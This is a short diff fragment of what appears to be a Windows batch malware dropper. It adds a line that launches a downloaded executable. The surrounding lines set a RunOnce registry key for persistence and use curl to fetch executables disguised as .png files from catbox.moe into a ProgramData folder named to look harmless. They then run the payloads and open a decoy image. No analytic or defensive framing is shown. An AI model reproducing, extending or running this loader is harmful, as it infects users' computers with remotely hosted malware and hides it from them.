@@ -8,5 +8,6 @@ powershell.exe saps cmd.exe '/c %windir%\System32\WindowsPowerShell\v1.0\powersh
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v SystemTray /t REG_SZ /d %programdata%\GraphicsType\SystemTray.bat
 curl -X GET https://files.catbox.moe/5v4rjb.png -o %programdata%\GraphicsType\winint.exe
 curl -X GET https://files.catbox.moe/g08ugo.png -o %programdata%\GraphicsType\SystemTray.exe
+start explorer.exe %programdata%\GraphicsType\winint.exe
 start explorer.exe %programdata%\GraphicsType\SystemTray.exe
 start %temp%\seins.jpg
